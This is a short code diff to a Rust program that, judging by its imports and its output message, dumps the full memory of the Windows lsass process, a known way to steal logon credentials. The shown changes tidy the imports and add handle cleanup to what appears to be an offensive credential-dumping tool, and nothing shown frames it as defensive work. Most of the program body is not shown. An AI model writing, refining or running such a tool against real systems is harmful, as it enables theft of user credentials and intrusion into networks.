@@ -1,8 +1,11 @@
 use std::{ffi::CString, process::exit, ptr::null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::core::PCSTR;
-use windows::Win32::Foundation::HANDLE;
-use windows::Win32::Storage::FileSystem::{CreateFileA, FILE_SHARE_WRITE, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, CREATE_ALWAYS};
+use windows::Win32::Foundation::{CloseHandle, HANDLE};
+use windows::Win32::Storage::FileSystem::{
+    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_READ,
+    FILE_SHARE_WRITE,
+};
 use windows::Win32::System::Diagnostics::Debug::{MiniDumpWithFullMemory, MiniDumpWriteDump};
 use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
 
@@ -70,6 +73,9 @@ fn main() {
             exit(-1);
         });
 
-        println!("[+] lsass dump successful!")
+        println!("[+] lsass dump successful!");
+
+        CloseHandle(hprocess);
+        CloseHandle(hfile);
     }
 }
